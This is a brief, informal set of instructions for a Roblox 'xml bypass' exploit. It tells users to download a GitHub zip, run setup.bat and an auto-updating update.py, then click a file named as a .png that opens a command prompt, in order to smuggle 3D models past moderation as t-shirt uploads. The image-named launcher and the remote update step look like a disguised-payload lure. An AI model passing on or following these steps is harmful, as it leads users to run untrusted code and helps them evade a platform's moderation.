Download the .zip "https://github.com/Vxlkz/rblx-xml-bypass-2024/archive/refs/heads/main.zip" and unzip it. 

Then run "setup.bat", if u dont have python installed/updated.

then run "update.py" to get the latest version of this exploit. Now go into the "image.zip" folder and click the "tshirt-xml-byprcs.png" and it should open cmd,

it will ask u to enter the .obj file's path with the model in it that u want as xml then compressed into a .png file once again so u can upload it as a tshirt.
